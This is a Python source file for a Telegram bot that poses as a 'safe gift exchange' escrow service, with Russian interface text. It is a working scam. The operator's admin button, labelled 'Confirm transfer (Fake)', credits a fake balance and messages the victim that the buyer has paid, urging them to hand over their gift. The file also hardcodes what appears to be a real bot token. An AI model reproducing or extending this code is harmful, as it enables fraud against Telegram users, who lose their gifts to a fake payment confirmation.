import os
import sys
import telebot
from telebot import types
from flask import Flask, request

# ----------------- НАСТРОЙКИ -----------------
BOT_TOKEN = "8687071276:AAFq-rWPetSgPw7HGFB62fJ6b0od5qhVoVs"  # Замените на токен от @BotFather целиком
ADMIN_ID = 7601008774          # Замените на ваш числовой ID (БЕЗ КАВЫЧЕК!)
# ----------------------------------------------

# Инициализация Flask и Telebot
app = Flask(__name__)
bot = telebot.TeleBot(BOT_TOKEN, threaded=False)

# Фейковая база данных балансов пользователей (ID: баланс звёзд)
user_balances = {}
# Временное хранилище для шагов создания оффера
user_steps = {}

def main_menu():
    markup = types.InlineKeyboardMarkup()
    markup.row(types.InlineKeyboardButton(text="❔ Помощь (Help)", callback_data="help"))
    markup.row(types.InlineKeyboardButton(text="💎 Выставить оффер на продажу", callback_data="make_offer"))
    markup.row(types.InlineKeyboardButton(text="🎁 Передать подарок покупателю", callback_data="transfer_gift"))
    return markup

@bot.message_handler(commands=['start'])
def cmd_start(message):
    user_id = message.from_user.id
    if user_id not in user_balances:
        user_balances[user_id] = 0
        
    bot.send_message(
        message.chat.id,
        f"👋 Добро пожаловать в сервис безопасного обмена подарков!\n\n"
        f"💰 Ваш текущий баланс: ⭐️ **{user_balances[user_id]} Stars**\n\n"
        f"Выберите нужное действие в меню ниже:",
        reply_markup=main_menu()
    )

@bot.callback_query_handler(func=lambda call: True)
def callback_listener(call):
    user_id = call.from_user.id
    
    if call.data == "help":
        bot.edit_message_text(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            text="ℹ️ **Справка по использованию бота**\n\n"
                 "1. Нажмите кнопку 'Выставить оффер на продажу'.\n"
                 "2. Укажите название вашего подарка и желаемую стоимость в Звёздах (Stars).\n"
                 "3. Наш гарант-сервис заморозит Звёзды покупателя на время сделки.\n"
                 "4. После подтверждения перевода вы сможете передать подарок покупателю.",
            reply_markup=main_menu()
        )
        bot.answer_callback_query(call.id)
        
    elif call.data == "transfer_gift":
        bot.edit_message_text(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            text="⚠️ **Ошибка передачи**\n\n"
                 "Вы не можете передать подарок, пока ваш активный оффер не подтверждён администрацией "
                 "и звёзды покупателя не поступили на транзитный баланс системы.",
            reply_markup=main_menu()
        )
        bot.answer_callback_query(call.id)
        
    elif call.data == "make_offer":
        msg = bot.send_message(call.message.chat.id, "📦 Введите название или ID подарка, который хотите выставить на продажу:")
        bot.register_next_step_handler(msg, process_gift_name)
        bot.answer_callback_query(call.id)
        
    elif call.data.startswith("fake_confirm_"):
        data_parts = call.data.split("_")
        target_user_id = int(data_parts[2])
        stars_count = int(data_parts[3])
        
        if target_user_id in user_balances:
            user_balances[target_user_id] += stars_count
        else:
            user_balances[target_user_id] = stars_count
            
        bot.edit_message_text(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            text=f"{call.message.text}\n\n🟢 **Вы успешно подтвердили фейковый перевод! Баланс пользователя обновлен.**"
        )
        
        try:
            bot.send_message(
                target_user_id,
                f"🎉 **Перевод звёзд подтверждён!**\n\n"
                f"Покупатель успешно перевёл ⭐️ **{stars_count} Telegram Stars** на ваш внутренний баланс сплит-системы.\n\n"
                f"💰 Ваш текущий баланс: ⭐️ **{user_balances[target_user_id]} Stars**\n\n"
                f"Звёзды будут окончательно доступны для вывода сразу после того, как вы передадите подарок покупателю.\n"
                f"Воспользуйтесь кнопкой **'Передать подарок покупателю'** для завершения сделки."
            )
        except Exception:
            bot.send_message(call.message.chat.id, f"❌ Не удалось отправить уведомление пользователю {target_user_id}.")
        bot.answer_callback_query(call.id)

def process_gift_name(message):
    user_steps[message.from_user.id] = {'gift_name': message.text}
    msg = bot.send_message(message.chat.id, "💰 Укажите стоимость продажи в Telegram Stars (только число):")
    bot.register_next_step_handler(msg, process_stars_price)

def process_stars_price(message):
    user_id = message.from_user.id
    if not message.text.isdigit():
        msg = bot.send_message(message.chat.id, "Пожалуйста, введите корректное число звёзд:")
        bot.register_next_step_handler(msg, process_stars_price)
        return
        
    stars = int(message.text)
    gift = user_steps.get(user_id, {}).get('gift_name', 'Подарок')
    
    bot.send_message(
        message.chat.id,
        f"⏳ **Оффер успешно создан!**\n\n"
        f"• Подарок: {gift}\n"
        f"• Стоимость: ⭐️ {stars} Stars\n\n"
        f"Заявка отправлена на проверку. Ожидайте подтверждения перевода звёзд от гаранта."
    )
    
    admin_markup = types.InlineKeyboardMarkup()
    admin_markup.row(types.InlineKeyboardButton(
        text="✅ Подтвердить перевод звезд (Фейк)", 
        callback_data=f"fake_confirm_{user_id}_{stars}"
    ))
    
    bot.send_message(
        ADMIN_ID,
        f"🔔 **Новый оффер на продажу!**\n\n"
        f"👤 От: @{message.from_user.username or 'без_юзернейма'} (ID: {user_id})\n"
        f"🎁 Подарок: {gift}\n"
        f"⭐️ Цена: {stars} Stars",
        reply_markup=admin_markup
    )

@bot.message_handler(commands=['balance'])
def check_balance(message):
    balance = user_balances.get(message.from_user.id, 0)
    bot.send_message(message.chat.id, f"💰 Ваш текущий баланс: ⭐️ **{balance} Stars**")

# Маршруты для Webhook (Render принимает запросы сюда)
@app.route('/', methods=['GET'])
def index():
    return "Сервер работает!", 200

@app.route('/' + BOT_TOKEN, methods=['POST'])
def get_message():
    json_string = request.get_data().decode('utf-8')
    update = types.Update.de_json(json_string)
    bot.process_new_updates([update])
    return "ok", 200

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get('PORT', 5000)))
